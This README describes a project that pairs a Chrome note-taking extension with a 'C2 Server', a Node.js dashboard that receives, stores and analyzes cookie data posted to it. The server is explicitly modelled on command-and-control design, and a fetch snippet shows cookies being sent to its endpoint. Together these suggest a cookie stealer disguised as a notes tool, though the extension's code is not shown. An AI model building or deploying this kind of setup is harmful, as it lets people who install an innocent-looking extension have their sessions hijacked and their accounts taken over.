# Cookie Extension & Notes Management System

A comprehensive project consisting of two main components: **Notes Extension** - a professional Chrome extension for note management, and **C2 Server** - a modern cookie management server with an advanced dashboard interface.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Project Structure](#project-structure)
- [Technology Stack](#technology-stack)
- [API Documentation](#api-documentation)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

## Overview

This project provides a complete solution for note-taking and cookie management. The Notes Extension offers a feature-rich interface for managing personal notes directly in the browser, while the C2 Server provides a professional dashboard for monitoring and analyzing cookie data in real-time.

### Notes Extension

A Chrome extension built with Manifest V3 that provides a modern, intuitive interface for note management. It includes features such as dark/light mode, color coding, search and filter capabilities, and seamless integration with browser context menus.

### C2 Server

A Node.js-based server application with Express.js that receives, stores, and analyzes cookie data. The server features a professional dashboard interface inspired by C2 server design patterns, complete with real-time analytics and data visualization.

## Features

### Notes Extension

#### User Interface

- **Dark/Light Mode**: Seamless theme switching with persistent preferences
- **Modern UI Design**: Clean, professional interface with smooth animations
- **Responsive Layout**: Optimized for various screen sizes and resolutions
- **Color Coding System**: Visual organization through color-coded notes

#### Note Management

- **Quick Note Creation**: Fast note entry with textarea input
- **Inline Editing**: Direct editing by clicking on note content
- **Pin Functionality**: Mark important notes for quick access
- **Delete Operations**: Remove individual or multiple notes
- **Label System**: Categorize notes (Work, Personal, Important)
- **Local Storage**: Data persistence using Chrome Storage API

#### Search and Filter

- **Real-time Search**: Instant search across note content and labels
- **Label Filtering**: Filter notes by category
- **Pinned Notes Filter**: Quick access to important notes
- **Sorting Options**: Sort by newest, oldest, pinned status, or label

#### Advanced Features

- **Context Menu Integration**: Save selected text as notes via right-click menu
- **Notification System**: Success notifications for user actions
- **Auto-save**: Automatic saving on create/edit operations
- **Keyboard Shortcuts**:
  - `Enter`: Save new note
  - `Ctrl+Enter`: Save when editing
  - `Escape`: Cancel editing

### C2 Server

#### Dashboard Features

- **Real-time Monitoring**: Live tracking of received cookies
- **Professional UI**: C2 server-style interface with dark theme
- **Data Table**: Comprehensive data table with full information
- **Search and Filter**: Advanced search and filtering capabilities
- **Duplicate Hiding**: Option to hide duplicate cookie entries
- **Data Export**: Export data to JSON format

#### Analytics Dashboard

- **Timeline Chart**: Visual representation of cookie reception over time
- **Hourly Distribution**: Cookie distribution analysis by hour
- **Daily Statistics**: Daily cookie reception statistics
- **Size Distribution**: Data size distribution visualization
- **Activity Log**: Recent activity tracking
- **Real-time Statistics**: Auto-updating statistics

#### Server Features

- **RESTful API**: Complete REST API endpoints
- **CORS Support**: Cross-origin request handling
- **Auto-refresh**: Automatic data refresh functionality
- **Cookie Management**: Full CRUD operations for cookies
- **Timestamp Tracking**: Precise timestamp recording for each cookie

## Installation

### System Requirements

- Node.js >= 14.x
- npm >= 6.x or yarn >= 1.x
- Google Chrome or Chromium-based browser (latest version)

### Server Installation

1. Navigate to the server directory:

```bash
cd c2-server
```

2. Install dependencies:

```bash
npm install
```

3. Start the server:

```bash
npm start
```

For development with auto-reload:

```bash
npm run start
```

The server will be available at: `http://localhost:3000`

### Chrome Extension Installation

1. Open Google Chrome and navigate to `chrome://extensions/`
2. Enable **Developer mode** (toggle in the top-right corner)
3. Click **Load unpacked**
4. Select the `note-extension` directory
5. The extension will be installed and appear in the browser toolbar

## Usage

### Notes Extension

#### Creating a New Note

1. Click the extension icon in the browser toolbar
2. Enter note content in the textarea
3. Optionally select a color and label
4. Click **Add Note** or press `Enter`

#### Editing a Note

1. Click on the note content you wish to edit
2. Modify the content in the textarea
3. Click **Save** or press `Ctrl+Enter`
4. Click **Cancel** or press `Escape` to cancel

#### Using Context Menu

1. Select text on any webpage
2. Right-click and select **Save to Notes Plus**
3. The note will be created automatically

#### Search and Filter

- Use the search bar to find notes
- Click filter buttons to filter by label
- Use the dropdown menu to sort notes

### C2 Server

#### Viewing Dashboard

1. Open a web browser and navigate to `http://localhost:3000`
2. View the cookie list in the data table
3. Use the search bar to find specific cookies
4. Enable **Hide Duplicates** to filter duplicate entries

#### Viewing Analytics

1. Click **Analytics** in the sidebar
2. View charts and statistics
3. Select time range for timeline chart
4. Enable **Hide Duplicates** for unique data analysis

#### Sending Cookies to Server

```javascript
// Using fetch API
fetch("http://localhost:3000/", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain",
  },
  body: "cookie_data_here",
})
  .then((response) => response.text())
  .then((data) => console.log(data));
```

## Project Structure

```
cookie-extension/
├── note-extension/              # Chrome Extension
│   ├── background.js            # Service worker
│   ├── popup.html               # Popup interface
│   ├── popup.js                 # Popup logic
│   ├── styles.css               # Styles (unused, styles inline)
│   ├── manifest.json            # Extension manifest
│   └── icons/                   # Extension icons
│       ├── icon16.ico
│       ├── icon48.ico
│       └── icon128.ico
│
└── c2-server/                   # Node.js Server
    ├── server.js                # Server main file
    ├── package.json             # Dependencies
    ├── public/                  # Static files
    │   ├── index.html           # Dashboard page
    │   ├── analytics.html       # Analytics page
    │   └── styles.css           # Shared styles
    └── node_modules/            # Dependencies
```

## Technology Stack

### Notes Extension

- **HTML5/CSS3**: Interface and styling
- **Vanilla JavaScript**: Core logic and functionality
- **Chrome Extension API**: Storage, Context Menus, Notifications
- **Font Awesome**: Icon library
- **Chrome Storage API**: Local data persistence

### C2 Server

- **Node.js**: Runtime environment
- **Express.js**: Web application framework
- **Chart.js**: Data visualization and charting
- **Font Awesome**: Icon library
- **HTML5/CSS3**: Dashboard interface

## API Documentation

### POST `/`

Receives cookie data from client.

**Request:**

```
Content-Type: text/plain
Body: cookie_data_string
```

**Response:**

```
Cookie đã được nhận thành công!
```

**Status Codes:**

- `200 OK`: Cookie received successfully

### GET `/get-cookie-names`

Retrieves an array of cookie names.

**Response:**

```json
["cookie1", "cookie2", "cookie3"]
```

**Status Codes:**

- `200 OK`: Success

### GET `/get-cookies`

Retrieves full cookie list with metadata.

**Response:**

```json
[
  {
    "id": 1,
    "data": "cookie_data",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
]
```

**Status Codes:**

- `200 OK`: Success

### POST `/clear-cookies`

Clears all stored cookies.

**Response:**

```json
{
  "success": true,
  "message": "All cookies cleared"
}
```

**Status Codes:**

- `200 OK`: Cookies cleared successfully

### DELETE `/cookie/:id`

Deletes a specific cookie by ID.

**Parameters:**

- `id` (integer): Cookie ID

**Response:**

```json
{
  "success": true,
  "message": "Cookie deleted"
}
```

**Status Codes:**

- `200 OK`: Cookie deleted successfully
- `404 Not Found`: Cookie not found

## Configuration

### Server Configuration

The server runs on port 3000 by default. To change the port, modify the `server.js` file:

```javascript
app.listen(3000, () => {
  // Change 3000 to your desired port
});
```

### Extension Configuration

Extension settings are stored in Chrome's local storage. Preferences such as dark mode and filter settings are automatically saved and restored.

## Troubleshooting

### Server Not Starting

**Issue**: Server fails to start or crashes immediately.

**Solutions**:

- Verify port 3000 is not in use: `netstat -ano | findstr :3000` (Windows) or `lsof -i :3000` (Mac/Linux)
- Ensure dependencies are installed: `npm install`
- Check Node.js version: `node --version` (should be >= 14.x)
- Review server logs for error messages

### Extension Not Working

**Issue**: Extension does not appear or function incorrectly.

**Solutions**:

- Verify Developer mode is enabled in `chrome://extensions/`
- Reload the extension in `chrome://extensions/`
- Check browser console for errors (F12)
- Verify manifest.json is valid
- Clear extension storage and reload

### Cookies Not Displaying

**Issue**: Cookies are not visible in the dashboard.

**Solutions**:

- Confirm server is running: `http://localhost:3000`
- Check CORS settings in server configuration
- Inspect Network tab in browser DevTools
- Verify API endpoints are accessible
- Check browser console for error messages

## Contributing

Contributions are welcome and encouraged. Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Code Style

- Follow existing code formatting
- Add comments for complex logic
- Update documentation for new features
- Write clear commit messages

### Pull Request Process

1. Ensure your code follows the project's style guidelines
2. Update README.md if necessary
3. Test your changes thoroughly
4. Submit a clear description of changes

## License

This project is licensed under the ISC License.

## Author

Developed for efficient note-taking and cookie management.

## Acknowledgments

- [Chart.js](https://www.chartjs.org/) - Data visualization library
- [Font Awesome](https://fontawesome.com/) - Icon library
- [Express.js](https://expressjs.com/) - Web application framework

## Disclaimer

This project is developed for educational and personal management purposes. Please use responsibly and in compliance with privacy and security regulations. Users are responsible for ensuring their usage complies with applicable laws and regulations.
